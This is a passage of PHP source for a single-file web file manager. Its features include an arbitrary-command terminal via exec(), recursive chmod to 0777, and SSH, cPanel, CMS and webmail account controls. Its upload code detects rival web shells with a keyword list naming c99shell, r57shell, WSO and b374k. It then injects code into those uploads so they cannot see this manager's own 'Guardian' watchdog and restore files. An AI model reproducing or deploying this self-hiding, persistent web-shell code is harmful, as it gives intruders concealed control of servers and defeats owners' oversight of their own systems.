        $cores=0;$model='';
        if(is_file('/proc/cpuinfo')){
            $ci=@file_get_contents('/proc/cpuinfo');
            if($ci){$cores=substr_count($ci,'processor');if(preg_match('/model name\s*:\s*(.+)/',$ci,$mm))$model=trim($mm[1]);}
        }
        if(!$cores&&function_exists('shell_exec')){$n=(int)trim((string)@shell_exec('nproc'));if($n>0)$cores=$n;}
        return [
            'load'=>$load?array_map(fn($v)=>round($v,2),$load):null,
            'mem_total'=>$memTotal,'mem_used'=>$memUsed,'mem_pct'=>$memPct,
            'uptime'=>$uptime,
            'cpu_cores'=>$cores?:null,'cpu_model'=>$model,
            'processes'=>count(glob('/proc/[0-9]*',GLOB_ONLYDIR)?:[]),
            'hostname'=>function_exists('gethostname')?gethostname():(function_exists('php_uname')?php_uname('n'):''),
            'server_ip'=>isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'',
            'client_ip'=>isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'',
            'disk_total'=>$dt,'disk_free'=>$df,'disk_used'=>$du,'disk_pct'=>$dt>0?round($du/$dt*100):0,
        ];
    }

    /* PHP error log */
    public function errLogPath(){$p=@ini_get('error_log');return $p?:'';}
    public function getErrLog($n=300){
        $p=$this->errLogPath();
        if(!$p||!is_file($p)||!is_readable($p))return['path'=>$p,'lines'=>[],'size'=>0];
        $sz=filesize($p);$max=2*1024*1024;
        $fh=@fopen($p,'r');if(!$fh)return['path'=>$p,'lines'=>[],'size'=>$sz];
        $seek=$sz>$max?$sz-$max:0;fseek($fh,$seek);
        $data=fread($fh,$sz-$seek);fclose($fh);
        $lines=preg_split('/\r\n|\n|\r/',trim($data));
        if($lines===[''])$lines=[];
        $lines=array_slice($lines,-$n);
        return['path'=>$p,'lines'=>$lines,'size'=>$sz];
    }
    private function clearErrLog(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $p=$this->errLogPath();
        if(!$p||!is_file($p)){$this->addMsg('No error log configured.','warning');return;}
        if(@file_put_contents($p,'')!==false){$this->log('clear_errlog','');$this->addMsg('Error log cleared.','warning');}
        else $this->addMsg('Cannot clear log (permission denied).','danger');
    }

    /* Environment variables (secrets redacted) */
    public function getEnvSafe(){
        $e=array_merge(is_array($_ENV)?$_ENV:[],getenv()?:[]);
        $out=[];
        foreach($e as $k=>$v){
            if(is_array($v))$v=json_encode($v);
            $v=(string)$v;
            if(preg_match('/SECRET|PASS|PWD|TOKEN|KEY|CREDENTIAL|AUTH|DATABASE|DSN|URL|URI|CONN|COOKIE/i',$k)){$v='••••••••';}
            elseif(preg_match('#://[^/\s]*:[^/\s@]*@#',$v)){$v='••••••••';} // redact any embedded user:pass@ connection string regardless of key name
            $out[$k]=$v;
        }
        ksort($out);return $out;
    }

    /* Large-file scanner (recursive, time-capped) */
    public function findLargeFiles($minBytes){
        $sd=$this->currentDir;$res=[];$start=microtime(true);$cap=8;$capped=false;$cnt=0;
        try{$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sd,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);}
        catch(Exception $e){return['files'=>[],'capped'=>false];}
        foreach($it as $item){
            if(microtime(true)-$start>$cap){$capped=true;break;}
            if(!$item->isFile())continue;
            $p=$item->getPathname();if(strpos($p,$this->trashDir)===0)continue;if($p===__FILE__)continue;
            $sz=$item->getSize();if($sz<$minBytes)continue;
            $res[]=['path'=>$p,'name'=>$item->getFilename(),'dir'=>dirname($p),'size'=>$sz];
            $cnt++;if($cnt>=500){$capped=true;break;}
        }
        usort($res,fn($a,$b)=>$b['size']<=>$a['size']);
        return['files'=>$res,'capped'=>$capped];
    }

    /* Duplicate-file finder (size, then md5, time-capped) */
    public function findDuplicates(){
        $sd=$this->currentDir;$bySize=[];$start=microtime(true);$cap=8;$capped=false;$cnt=0;
        try{$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sd,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);}
        catch(Exception $e){return['groups'=>[],'capped'=>false];}
        foreach($it as $item){
            if(microtime(true)-$start>$cap){$capped=true;break;}
            if(!$item->isFile())continue;
            $p=$item->getPathname();if(strpos($p,$this->trashDir)===0)continue;if($p===__FILE__)continue;
            $sz=$item->getSize();if($sz===0)continue;
            $bySize[$sz][]=$p;$cnt++;if($cnt>=5000){$capped=true;break;}
        }
        $groups=[];
        foreach($bySize as $sz=>$paths){
            if(count($paths)<2)continue;
            if(microtime(true)-$start>$cap){$capped=true;break;}
            $byHash=[];
            foreach($paths as $p){$h=@md5_file($p);if($h===false)continue;$byHash[$h][]=$p;}
            foreach($byHash as $h=>$fps){
                if(count($fps)<2)continue;
                $groups[]=['hash'=>$h,'size'=>$sz,'files'=>array_map(fn($p)=>['path'=>$p,'name'=>basename($p),'dir'=>dirname($p)],$fps)];
            }
        }
        usort($groups,fn($a,$b)=>$b['size']<=>$a['size']);
        return['groups'=>$groups,'capped'=>$capped];
    }

    /* One-click backup of current folder as .zip */
    private function backupDir(){
        if(!class_exists('ZipArchive')){$this->addMsg('ZIP extension not available.','danger');return;}
        $bdir=__DIR__.'/.backups';if(!is_dir($bdir))@mkdir($bdir,0755,true);
        $name='backup_'.preg_replace('/[^A-Za-z0-9_-]/','_',basename($this->currentDir)).'_'.date('Ymd_His').'.zip';
        $zp=$bdir.'/'.$name;
        $z=new ZipArchive();if($z->open($zp,ZipArchive::CREATE)!==true){$this->addMsg('Could not create backup archive.','danger');return;}
        $this->zadd($z,$this->currentDir,basename($this->currentDir));
        $z->close();
        $this->log('backup_dir',$name);
        $this->addMsg('Backup created: .backups/'.$name,'success');
    }

    /* Delete an absolute path, restricted to inside the current directory tree (used by the large-file / duplicate tools) */
    private function deleteAbs(){
        if($this->readonly){$this->addMsg('Read-only account.','danger');return;}
        $p=isset($_POST['abs_path'])?$_POST['abs_path']:'';
        $rp=realpath($p);
        $base=rtrim($this->currentDir,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
        if(!$rp||$rp===__FILE__||strpos($rp.DIRECTORY_SEPARATOR,$base)!==0){$this->addMsg('Invalid or out-of-scope path.','danger');return;}
        $n=basename($rp);
        if($this->rmdirR($rp)){$this->log('delete_abs',$n);$this->addMsg('Deleted "'.$n.'".','warning');}
        else $this->addMsg('Delete failed.','danger');
    }

    /* Checksum */
    public function checksum($fn){
        $p=realpath($this->currentDir.'/'.$fn);
        if(!$p||!is_file($p)||$p===__FILE__)return null;
        return['md5'=>md5_file($p),'sha1'=>sha1_file($p),'sha256'=>hash_file('sha256',$p),'size'=>filesize($p),'name'=>$fn];
    }

    /* Assistant Agent file actions. These use the same scope and safety
       boundaries as the visible manager instead of exposing a second file API. */
    private function agentPath($value,$allowMissing=false){
        $value=trim((string)$value);
        if($value==='')return false;
        $base=$this->root?:__DIR__;
        if($value==='~')$value=$base;
        elseif(strpos($value,'~/')===0)$value=$base.'/'.substr($value,2);
        elseif($value[0]!=='/'&&!preg_match('/^[A-Za-z]:[\\\\\/]/',$value))$value=$this->currentDir.'/'.$value;
        $resolved=realpath($value);
        if($resolved===false&&$allowMissing){
            $parent=realpath(dirname($value));
            if($parent!==false)$resolved=rtrim($parent,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.basename($value);
        }
        if($resolved===false)return false;
        if($this->root){
            $prefix=rtrim($this->root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
            if($resolved!==$this->root&&strpos($resolved.DIRECTORY_SEPARATOR,$prefix)!==0)return false;
        }
        return $resolved;
    }
    public function agentFileAction($type,$argument){
        if($this->readonly)return['ok'=>false,'output'=>'Read-only account: file changes are disabled.'];
        $type=strtolower(trim((string)$type));$argument=trim((string)$argument);
        $parts=preg_split('/\s*(?:->|\|)\s*/',$argument,2);
        $fail=function($message){return['ok'=>false,'output'=>$message];};
        if(in_array($type,['delete','create','mkdir','duplicate','extract'],true)){
            $path=$this->agentPath($argument,$type==='create'||$type==='mkdir');
            if($path===false)return $fail('Path is invalid or outside the allowed scope.');
        }else{
            if(count($parts)!==2)return $fail('Expected source -> destination.');
            $src=$this->agentPath($parts[0]);$dst=$this->agentPath($parts[1],true);
            if($src===false||$dst===false)return $fail('Source or destination is invalid or outside the allowed scope.');
        }
        if($type==='delete'){
            if(!file_exists($path)||$this->isSelf(basename($path))||$this->isGuardianFile(basename($path),$path))return $fail('Delete denied for this path.');
            $name=basename($path);$ok=$this->moveToTrash($path,dirname($path));
            if($ok){$this->log('trash',$name);return['ok'=>true,'output'=>'Moved to trash: '.$name];}
            return $fail('Delete failed.');
        }
        if($type==='create'){
            if(file_exists($path))return $fail('A file with that name already exists.');
            $ok=@file_put_contents($path,'')!==false;
            if($ok){$this->log('create',basename($path));return['ok'=>true,'output'=>'Created file: '.basename($path)];}
            return $fail('Could not create the file.');
        }
        if($type==='mkdir'){
            if(file_exists($path))return $fail('A file or folder with that name already exists.');
            $ok=@mkdir($path,0755,true);
            if($ok){$this->log('mkdir',basename($path));return['ok'=>true,'output'=>'Created folder: '.basename($path)];}
            return $fail('Could not create the folder.');
        }
        if($type==='duplicate'){
            if(!is_file($path)||$this->isSelf(basename($path)))return $fail('Only a regular, non-manager file can be duplicated.');
            $ext=pathinfo($path,PATHINFO_EXTENSION);$base=pathinfo($path,PATHINFO_FILENAME);$name=$base.'_copy'.($ext?'.'.$ext:'');$i=1;
            while(file_exists(dirname($path).'/'.$name)){$name=$base.'_copy'.$i.($ext?'.'.$ext:'');$i++;}
            $ok=@copy($path,dirname($path).'/'.$name);
            if($ok){$this->log('duplicate',basename($path).' → '.$name);return['ok'=>true,'output'=>'Duplicated as: '.$name];}
            return $fail('Duplicate failed.');
        }
        if($type==='extract'){
            if(!is_file($path))return $fail('Archive not found.');
            $ext=strtolower(pathinfo($path,PATHINFO_EXTENSION));$target=dirname($path).'/'.pathinfo($path,PATHINFO_FILENAME);
            if($ext==='zip'&&class_exists('ZipArchive')){
                $z=new ZipArchive();if($z->open($path)===true){if(!file_exists($target))@mkdir($target,0755,true);$ok=$z->extractTo($target);$z->close();if($ok){$this->log('zip_extract',basename($path));return['ok'=>true,'output'=>'Extracted to: '.basename($target).'/'];}}
            }elseif(in_array($ext,['gz','bz2','tgz'],true)&&function_exists('exec')){
                if(!file_exists($target))@mkdir($target,0755,true);$out=[];$code=0;exec('tar -xf '.escapeshellarg($path).' -C '.escapeshellarg($target).' 2>&1',$out,$code);if($code===0){$this->log('tar_extract',basename($path));return['ok'=>true,'output'=>'Extracted to: '.basename($target).'/'];}
            }
            return $fail('Archive extraction is unavailable or failed.');
        }
        if($this->isSelf(basename($src))||$this->isGuardianFile(basename($src),$src)||$this->isGuardianFile(basename($dst),$dst))return $fail('This protected manager path cannot be changed.');
        if($type==='rename'){
            if(dirname($src)!==dirname($dst)||file_exists($dst)||!file_exists($src))return $fail('Rename requires an existing item and a free name in the same folder.');
            $ok=@rename($src,$dst);$msg='Renamed '.basename($src).' to '.basename($dst);
        }elseif($type==='copy'){
            if(!file_exists($src)||file_exists($dst))return $fail('Copy requires an existing source and a free destination.');
            $ok=$this->rcopy($src,$dst);$msg='Copied '.basename($src).' to '.basename($dst);
        }elseif($type==='move'){
            if(!file_exists($src)||file_exists($dst))return $fail('Move requires an existing source and a free destination.');
            $ok=@rename($src,$dst);$msg='Moved '.basename($src).' to '.basename($dst);
        }else{return $fail('Unsupported file action.');}
        if($ok){$this->log($type,$msg);return['ok'=>true,'output'=>$msg];}
        return $fail(ucfirst($type).' failed.');
    }

    /* Terminal */
    public function getTerminalPromptPath(){
        $base=$this->root?:__DIR__;
        $cwd=$this->currentDir;
        if($cwd===$base)return'~';
        $prefix=rtrim($base,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
        if(strpos($cwd,$prefix)===0)return'~/'.str_replace(DIRECTORY_SEPARATOR,'/',substr($cwd,strlen($prefix)));
        return str_replace(DIRECTORY_SEPARATOR,'/',$cwd);
    }
    private function terminalPathAllowed($path){
        if(!$this->root)return true;
        $prefix=rtrim($this->root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
        return $path===$this->root||strpos($path,$prefix)===0;
    }
    public function runCmd($cmd){
        if(empty(trim($cmd)))return['output'=>'','exit'=>0,'ms'=>0];
        $t=microtime(true);$out=[];$exit=0;
        $cmd=trim($cmd);
        if(preg_match('/^cd(?:\s+(.*))?$/s',$cmd,$m)){
            $arg=trim($m[1]??'');
            if($arg!==''&&(($arg[0]==="'"&&substr($arg,-1)==="'")||($arg[0]==='"'&&substr($arg,-1)==='"')))$arg=substr($arg,1,-1);
            $base=$this->root?:__DIR__;
            if($arg===''||$arg==='~')$target=$base;
            elseif($arg==='-')$target=$_SESSION['fm_terminal_previous_dir']??$this->currentDir;
            elseif(strpos($arg,'~/')===0)$target=$base.'/'.substr($arg,2);
            elseif($arg[0]==='/'||preg_match('/^[A-Za-z]:[\\\\\/]/',$arg))$target=$arg;
            else $target=$this->currentDir.'/'.$arg;
            $resolved=realpath($target);
            if($resolved===false||!is_dir($resolved)||!$this->terminalPathAllowed($resolved)){
                $out[]='bash: cd: '.($arg===''?'~':$arg).': No such file or directory';$exit=1;
            }else{
                $_SESSION['fm_terminal_previous_dir']=$this->currentDir;
                $this->currentDir=$resolved;$_SESSION['fm_terminal_dir']=$resolved;
            }
        }else{
            if(!function_exists('exec')){
                return['output'=>'Terminal is unavailable: PHP exec() is disabled by the hosting provider. Enable exec in disable_functions or use the hosting control panel terminal.','exit'=>127,'ms'=>0,'cwd'=>$this->currentDir,'prompt'=>$this->getTerminalPromptPath()];
            }
            $cwd=escapeshellarg($this->currentDir);
            exec("cd $cwd && $cmd 2>&1",$out,$exit);
        }
        $this->log('terminal',$cmd);
        return['output'=>implode("\n",$out),'exit'=>$exit,'ms'=>round((microtime(true)-$t)*1000),'cwd'=>$this->currentDir,'prompt'=>$this->getTerminalPromptPath()];
    }

    /* Autocomplete */
    public function autocomplete($prefix){
        $items=@scandir($this->currentDir);if(!$items)return[];
        $res=[];$p=basename($prefix);
        foreach($items as $i){if($i==='.'||$i==='..')continue;if($p===''||stripos($i,$p)===0)$res[]=$i.(is_dir($this->currentDir.'/'.$i)?'/':'');}
        return array_slice($res,0,12);
    }

    /* Handle request */
    public function handle(){
        if($_SERVER['REQUEST_METHOD']!=='POST')return;
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){$this->addMsg('Security error.','danger');return;}
        $a=isset($_POST['action'])?$_POST['action']:'';
        if(!empty($_SESSION['fm_force_credential_change'])&&$a!=='change_default_credentials'){
            $this->addMsg('You must replace the default credentials before using the File Manager.','danger');return;
        }
        $wA=['upload','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs','bulk_chmod','copy_clipboard','cut_clipboard','paste_clipboard','chown_item','set_tag','remove_tag','remote_download','ssh_install','ssh_create_user','ssh_delete_user','ssh_update_user','cms_create_user','cms_delete_user','cms_update_role','cms_change_pass','cms_update_visibility','cms_toggle_plugin','cms_delete_plugin','cms_switch_theme','cms_delete_theme','cms_toggle_extension','cms_maintenance_toggle','wp_core_update','webmail_send','webmail_delete','webmail_mark'];
        if($this->readonly&&in_array($a,$wA)){$this->addMsg('Read-only account.','danger');return;}
        switch($a){
            case 'upload':         $this->upload();break;
            case 'create_folder':  $this->mkDir();break;
            case 'create_file':    $this->mkFile();break;
            case 'delete':         $this->delItem();break;
            case 'rename':         $this->renItem();break;
            case 'save_edit':      $this->saveFile();break;
            case 'bypass_perms':   $this->bypassPerms();break;
            case 'go_to_path':     $this->goPath();break;
            case 'add_favorite':   $this->addFav(isset($_POST['path'])?$_POST['path']:'');break;
            case 'remove_favorite':$this->removeFav(isset($_POST['path'])?$_POST['path']:'');break;
            case 'bulk_delete':    $this->bulkDel();break;
            case 'bulk_copy':      $this->bulkCopyMove(false);break;
            case 'bulk_move':      $this->bulkCopyMove(true);break;
            case 'zip_create':     $this->zipCreate();break;
            case 'zip_extract':    $this->zipExtract();break;
            case 'restore_trash':  $this->restoreTrash(isset($_POST['trash_id'])?$_POST['trash_id']:'');break;
            case 'trash_perm':     $this->permDelTrash(isset($_POST['trash_id'])?$_POST['trash_id']:'');break;
            case 'trash_empty':    $this->emptyTrash();break;
            case 'duplicate':      $this->dupFile();break;
            case 'tar_create':     $this->tarCreate();break;
            case 'tar_extract':    $this->tarExtract();break;
            case 'clear_log':      $this->clearLog();break;
            case 'batch_rename':   $this->batchRename();break;
            case 'create_symlink': $this->mkSymlink();break;
            case 'chmod_item':     $this->chmodItem();break;
            case 'create_share':   $this->createShare();break;
            case 'revoke_share':   $this->revokeShare(isset($_POST['share_id'])?$_POST['share_id']:'');break;
            case 'backup_dir':     $this->backupDir();break;
            case 'clear_errlog':   $this->clearErrLog();break;
            case 'delete_abs':     $this->deleteAbs();break;
            case 'bulk_chmod':     $this->bulkChmod();break;
            case 'copy_clipboard': $this->clipboard('copy');break;
            case 'cut_clipboard':  $this->clipboard('cut');break;
            case 'paste_clipboard':$this->pasteClipboard();break;
            case 'chown_item':     $this->chownItem();break;
            case 'set_tag':        $this->setTag();break;
            case 'remove_tag':     $this->removeTag();break;
            case 'remote_download':$this->remoteDownload();break;
            case 'ssh_install':     $this->sshInstall();break;
            case 'ssh_create_user': $this->sshCreateUser();break;
            case 'ssh_delete_user': $this->sshDeleteUser();break;
            case 'ssh_update_user': $this->sshUpdateUser();break;
            case 'cms_create_user':$this->cmsCreateUser();break;
            case 'cms_delete_user':$this->cmsDeleteUser();break;
            case 'cms_update_role':$this->cmsUpdateRole();break;
            case 'cms_change_pass':$this->cmsChangePass();break;
            case 'cms_update_visibility':$this->cmsUpdateVisibility();break;
            case 'cms_toggle_plugin':   $this->cmsTogglePlugin();break;
            case 'cms_delete_plugin':   $this->cmsDeletePlugin();break;
            case 'cms_switch_theme':    $this->cmsSwitchTheme();break;
            case 'cms_delete_theme':    $this->cmsDeleteTheme();break;
            case 'cms_toggle_extension':$this->cmsToggleExtension();break;
            case 'cms_maintenance_toggle':$this->cmsMaintenanceToggle();break;
             case 'wp_core_update':      $this->wpCoreUpdate();break;
            case 'cpanel_save_creds':   $this->cpanelSaveCreds();break;
            case 'cpanel_create':       $this->cpanelCreateAccount();break;
            case 'cpanel_change_pass':  $this->cpanelChangePass();break;
            case 'cpanel_suspend':      $this->cpanelSuspendToggle();break;
            case 'cpanel_terminate':    $this->cpanelTerminate();break;
            case 'webmail_send':   $this->webmailSend();break;
            case 'webmail_delete': $this->webmailDeleteMessage(isset($_POST['wm_mailbox'])?$_POST['wm_mailbox']:'',isset($_POST['wm_folder'])?$_POST['wm_folder']:'INBOX',isset($_POST['wm_uid'])?$_POST['wm_uid']:'0');break;
            case 'webmail_mark':    $this->webmailMark(isset($_POST['wm_mailbox'])?$_POST['wm_mailbox']:'',isset($_POST['wm_folder'])?$_POST['wm_folder']:'INBOX',isset($_POST['wm_uid'])?$_POST['wm_uid']:'0',isset($_POST['wm_flag'])?$_POST['wm_flag']:'seen',!empty($_POST['wm_set']));break;
            case 'logout':         session_destroy();header("Location: ".basename(__FILE__));exit;
        }
    }

    private function goPath(){$p=isset($_POST['path'])?trim($_POST['path']):'';if($p&&is_dir($p)){header("Location: ?dir=".urlencode($p));exit;}$this->addMsg('Invalid path.','danger');}

    /* ── Upload security helpers ── */

    /** Returns true if the temp file is a PHP file encrypted/obfuscated by a
     *  known encoder (IonCube, Zend Guard, SourceGuardian, eval+base64, etc.).
     *  Reads only the first 8 KB so it's fast on every upload. */
    private function isEncryptedPhp($tmpPath){
        $s=@file_get_contents($tmpPath,false,null,0,8192);
        if($s===false)return false;
        // ── Known encoder headers ──
        if(preg_match('/IonCube|IONCUBE_LOADER|ionCube Loader/i',$s))return true;
        if(preg_match('/Zend\s+Guard|@_ZEND_GUARD|zend_loader/i',$s)||substr(ltrim($s),0,10)==='<?php //00')return true;
        if(preg_match('/sg_load\s*\(|SourceGuardian/i',$s))return true;
        if(preg_match('/Obfuscator|phpjm\.net|phpxz\.net|NuSphere|NuCoder/i',$s))return true;
        // ── eval + decode combos (most common) ──
        if(preg_match('/\beval\s*\(\s*(base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|rawurldecode|hex2bin)\s*\(/i',$s))return true;
        if(preg_match('/@eval\s*\([^)]*?(base64_decode|gzinflate)\s*\(/is',$s))return true;
        // ── preg_replace /e (code execution via regex) ──
        if(preg_match('/preg_replace\s*\(\s*([\'"])[^\'"]+\/e\1/i',$s))return true;
        // ── Create-function obfuscation ──
        if(preg_match('/create_function\s*\(\s*[\'"][\'"],\s*(base64_decode|gzinflate)/i',$s))return true;
        // ── Large base64 blob that decodes to PHP ──
        if(preg_match('/[\'"]([A-Za-z0-9+\/]{500,}={0,2})[\'"]/',$s,$m)){
            $dec=@base64_decode($m[1],true);
            if($dec&&(strpos($dec,'<?php')!==false||strpos($dec,'eval(')!==false))return true;
        }
        // ── High density of hex escape sequences ──
        if(preg_match_all('/\\\\x[0-9a-fA-F]{2}/',$s,$hx)&&count($hx[0])>80&&strlen($s)>300)return true;
        return false;
    }

    /** Scores a PHP file for file-manager / web-shell indicators.
     *  Returns true when the combination of indicators is strong enough. */
    private function isWebShellOrFileMgr($tmpPath){
        $c=@file_get_contents($tmpPath,false,null,0,131072);
        if($c===false)return false;
        $score=0;
        if(preg_match('/\bscandir\s*\(/',$c))     $score+=2;
        if(preg_match('/\bopendir\s*\(/',$c))      $score+=2;
        if(preg_match('/\bglob\s*\(/',$c))         $score+=2;
        if(preg_match('/\b(shell_exec|system|passthru|proc_open|popen)\s*\(/',$c))$score+=3;
        if(preg_match('/\bexec\s*\(/',$c))         $score+=2;
        if(preg_match('/\bmove_uploaded_file\s*\(/',$c))$score+=3;
        if(preg_match('/\bfile_put_contents\s*\(/',$c))$score+=1;
        if(preg_match('/\$_(FILES)\s*\[/',$c))     $score+=2;
        if(preg_match('/\$_(POST|GET|REQUEST)\s*\[/',$c))$score+=1;
        if(preg_match('/\bchmod\s*\(/',$c))        $score+=1;
        if(preg_match('/\bReadDir|FilesMan|c99shell|r57shell|WSO|wso_find|b374k/i',$c))$score+=5;
        return $score>=6;
    }

    /** Injects a security layer into an uploaded file manager so it cannot
     *  see this file manager's own files or its Guardian support files.
     *  Uses output-buffering + scandir/glob wrappers — safe for all common
     *  single-file PHP managers. Returns true on success. */
    private function neuterFileMgr($filePath,$origName){
        $content=@file_get_contents($filePath);
        if($content===false||strlen($content)<20)return false;

        $myName=basename(__FILE__);
        // Files that must be hidden from any other file manager
        // launch.php is the new launcher name (hidden dir); include old webroot name too for legacy
        $hidden=json_encode(array_unique([$myName,'.fm_guardian_launch.php','.guardian-restore.php','launch.php',
            '.guardian_boot','.guardian_watchdog_attempt','.login_attempts.json','.htaccess']),JSON_UNESCAPED_UNICODE);

        // Security layer code injected right after <?php
        $inject=
'if(!defined(\'__FGS__\')){define(\'__FGS__\',1);'.
'$__fgh='.($hidden).';'.
'function __fgs($p,$o=SCANDIR_SORT_ASCENDING){global $__fgh;$r=@\scandir($p,$o);'.
'if(!is_array($r))return $r;'.
'return array_values(array_filter($r,function($v)use($__fgh){'.
'$b=basename((string)$v);'.
'return!in_array($b,$__fgh)&&!preg_match(\'/^\.fg_[0-9a-f]+$/\',$b);'.
'}));}'.
'function __fgg($p,$f=0){global $__fgh;$r=@\glob($p,$f);'.
'if(!is_array($r))return $r;'.
'return array_values(array_filter($r,function($v)use($__fgh){'.
'$b=basename((string)$v);'.
'return!in_array($b,$__fgh)&&!preg_match(\'/^\.fg_[0-9a-f]+$/\',$b);'.
'}));}'.
'@ob_start(function($b){global $__fgh;'.
'foreach($__fgh as $f){$e=htmlspecialchars($f,ENT_QUOTES);$u=urlencode($f);'.
'$b=str_replace([$f,$e,$u,rawurlencode($f),addslashes($f)],\'\',$b);}return $b;});}';

        // Insert right after <?php opening tag
        if(preg_match('/^<\?php\b/i',ltrim($content),$m,PREG_OFFSET_CAPTURE)){
            $pos=strpos($content,'<?php');
            $insert_at=$pos+5;
        } elseif(($pos=strpos($content,'<?'))!==false){
            $insert_at=$pos+2;
        } else {
            return false; // not a PHP file we can safely patch
        }
        $content=substr_replace($content,"\n".$inject,$insert_at,0);

        // Redirect scandir() and glob() calls to our safe wrappers
        // Negative lookbehind ensures we skip strings and already-prefixed calls
        $content=preg_replace('/(?<![\'"`_a-zA-Z0-9\\\\])\bscandir\s*\(/',    '__fgs(',  $content);
        $content=preg_replace('/(?<![\'"`_a-zA-Z0-9\\\\])\bglob\s*\(/',       '__fgg(',  $content);

        if(@file_put_contents($filePath,$content)===false)return false;
        $this->log('upload_neutered',$origName);
        return true;
    }

    private function upload(){
        if(!isset($_FILES['file']))return;
        $phpExts=['php','php3','php4','php5','php7','php8','phtml','phar','shtml','cgi'];
        $names=$_FILES['file']['name'];

        $doOne=function($tmpPath,$name) use($phpExts){
            $ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));
            $isPhp=in_array($ext,$phpExts);
            // ── Block encrypted / obfuscated PHP files ──
            if($isPhp&&$this->isEncryptedPhp($tmpPath)){
                @unlink($tmpPath);
                $this->addMsg("Blocked: \"$name\" — encrypted/obfuscated PHP files are not allowed.",'danger');
                $this->log('upload_blocked_encrypted',$name);
                return false;
            }
            $dest=$this->currentDir.'/'.basename($name);
            $existing=file_exists($dest)?$this->itemBytes($dest):0;
            $incoming=(int)@filesize($tmpPath);
            if(!$this->quotaAllows(max(0,$incoming-$existing))){
                @unlink($tmpPath);
                $this->addMsg("Quota exceeded: \"$name\" was not uploaded.",'danger');
                return false;
            }
            if(!move_uploaded_file($tmpPath,$dest))return false;
            // ── Detect and neuter uploaded file managers / web shells ──
            if($isPhp&&$this->isWebShellOrFileMgr($dest)){
                $this->neuterFileMgr($dest,basename($name));
                $this->addMsg("Uploaded &amp; secured: $name",'warning');
            } else {
                $this->addMsg("Uploaded: $name",'success');
            }
            $this->log('upload',$name);
            return true;
        };

        if(is_array($names)){
            $ok=0;$fail=0;
            foreach($names as $i=>$n){
                if($_FILES['file']['error'][$i]!==0){$fail++;continue;}
                if($doOne($_FILES['file']['tmp_name'][$i],basename($n)))$ok++;else $fail++;
            }
            if($ok>0)$this->addMsg("$ok file(s) processed.".($fail?" $fail failed.":''),'success');
            elseif($fail>0)$this->addMsg("$fail upload(s) failed.",'danger');
        } else {
            if($_FILES['file']['error']!==0)return;
            $doOne($_FILES['file']['tmp_name'],basename($names));
        }
    }
    private function mkDir(){$n=basename(trim(isset($_POST['folder_name'])?$_POST['folder_name']:'')); if(!$n)return;if(!$this->quotaAllows(0)){$this->addMsg('Quota exceeded.','danger');return;}$p=$this->currentDir.'/'.$n;if(!file_exists($p)&&@mkdir($p)){$this->log('mkdir',$n);$this->addMsg("Folder created: $n",'success');}else $this->addMsg('Could not create folder.','danger');}
    private function mkFile(){$n=basename(trim(isset($_POST['file_name'])?$_POST['file_name']:'')); if(!$n)return;if(!$this->quotaAllows(0)){$this->addMsg('Quota exceeded.','danger');return;}$p=$this->currentDir.'/'.$n;if(file_exists($p)){$this->addMsg('File already exists.','danger');return;}if(@file_put_contents($p,'')!==false){$this->log('create',$n);$this->addMsg("Created: $n",'success');header("Location: ?edit=".urlencode($n)."&dir=".urlencode($this->currentDir));exit;}$this->addMsg('Failed to create file.','danger');}
    private function delItem(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n||$this->isSelf($n)||$this->isGuardianFile($n,$this->currentDir.'/'.$n)){$this->addMsg('Access denied.','danger');return;}$p=$this->currentDir.'/'.$n;if($this->moveToTrash($p,$this->currentDir)){$this->log('trash',$n);$this->addMsg("Trashed: $n",'warning');}else $this->addMsg('Delete failed.','danger');}
    private function renItem(){$o=basename(isset($_POST['old_name'])?$_POST['old_name']:'');$nw=basename(isset($_POST['new_name'])?$_POST['new_name']:'');if(!$o||!$nw||$o===$nw)return;if($this->isSelf($o)||$this->isGuardianFile($o,$this->currentDir.'/'.$o)){$this->addMsg('Access denied.','danger');return;}$po=$this->currentDir.'/'.$o;$pn=$this->currentDir.'/'.$nw;if(file_exists($po)&&!file_exists($pn)&&@rename($po,$pn)){$this->log('rename',"$o → $nw");$this->addMsg('Renamed.','success');}else $this->addMsg('Rename failed.','danger');}
    private function saveFile(){$n=basename(isset($_POST['filename'])?$_POST['filename']:'');if(!$n||$this->isSelf($n))return;$p=$this->currentDir.'/'.$n;if(!file_exists($p)||!is_file($p)){$this->addMsg('File not found.','danger');return;}$c=isset($_POST['content'])?$_POST['content']:'';$delta=max(0,strlen($c)-(int)@filesize($p));if(!$this->quotaAllows($delta)){$this->addMsg('Quota exceeded. Free space or ask an administrator for a larger limit.','danger');return;}if(file_put_contents($p,$c)!==false){$this->log('edit',$n);$this->addMsg("Saved: $n",'success');}else $this->addMsg('Save failed.','danger');}
    private function bypassPerms(){$cnt=0;$f=0;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this->currentDir,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $item){$p=$item->getPathname();if($p===__FILE__)continue;if($item->isDir()){if(@chmod($p,0777))$cnt++;else $f++;}else{if(@chmod($p,0666))$cnt++;else $f++;}}$this->log('chmod',"$cnt changed");$this->addMsg("Permissions: $cnt changed".($f?", $f failed":""),$f?'warning':'success');}
